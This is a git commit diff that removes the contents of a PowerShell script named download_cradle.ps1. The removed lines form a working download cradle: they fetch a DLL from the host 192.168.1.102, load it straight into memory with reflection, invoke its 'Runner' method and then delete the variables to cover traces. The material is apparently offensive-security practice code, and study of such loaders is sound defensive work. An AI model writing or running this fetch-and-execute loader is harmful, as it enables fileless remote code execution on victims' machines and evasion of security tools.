80274797213414be4cc523ec3a563de98517fd52
Marco Petronio <87567996+marcoigorr@users.noreply.github.com>
2022-02-10 00:35:18 +0100

    Update download_cradle.ps1

--- download_cradle.ps1
+++ download_cradle.ps1
@@ -1,8 +1,1 @@
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
 
-$assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("ClassLibrary1.Class1")
-$method = $class.GetMethod("Runner")
-$method.Invoke(0, $null)
-
-Remove-Variable -Name data,assem,class,method -ErrorAction SilentlyContinue -Force
